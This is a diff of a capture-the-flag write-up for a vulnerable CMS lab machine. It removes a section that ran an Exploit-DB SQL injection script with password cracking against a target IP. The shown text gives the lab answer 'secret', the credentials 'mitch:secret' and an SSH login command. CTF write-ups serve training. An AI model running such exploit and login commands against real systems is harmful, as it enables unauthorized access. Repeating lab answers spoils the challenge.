@@ -105,20 +105,6 @@ And bingo, password cracked for username `mitch`
 ## 5. What's the password?
 > **secret**
 
-![Run file](images/run_tech.jpg)
-
-> If you have an error for *termcolor*.
-
-![Python Error](images/python_error.jpg)
-
-Download the **binaries** from the [Official Website][3]. Unzip the file using command `tar -xf <file_name>`. Change directory to the extracted folder and run `sudo python setup.py install`. This will solve your termcolor error.
-
-Run the file with `sudo python usr/share/exploitdb/exploits/php/webapps/46635.py -u http://<IP>/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`
-
-![Script Run](images/script_run.jpg)
-
-> The user credential is `mitch:secret`
-
 
 As we know `ssh` is open. Let's try to connect -> `ssh mitch@<IP> -p 2222`
 
